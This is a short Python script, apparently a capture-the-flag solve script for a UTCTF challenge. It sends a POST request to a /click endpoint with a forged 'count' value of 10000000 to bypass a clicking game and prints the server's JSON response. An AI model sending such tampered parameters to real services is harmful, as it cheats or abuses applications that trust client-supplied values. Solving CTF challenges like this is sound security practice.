import requests

url = "http://betta.utctf.live:8138/click"

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

data = {
    'count': 10000000
}

response = requests.post(url, headers=headers, data=data)

print(response.json())
